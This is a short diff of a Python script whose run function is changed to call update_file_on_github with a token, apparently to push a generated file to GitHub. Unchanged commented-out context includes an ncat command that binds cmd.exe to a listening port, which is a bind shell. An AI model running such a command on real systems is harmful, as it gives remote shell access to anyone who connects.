@@ -85,7 +85,7 @@ def run(token):
         print("text stmnt: "+ stmnt)
         create_file(fname,stmnt)
         #subir_archivo('data.txt', stmnt )
-        #update_file_on_github(fname,token)
+        update_file_on_github(fname,token)
         #delete_file("data.txt")
         
         #os.system('ncat -lvp 734 -e cmd.exe')
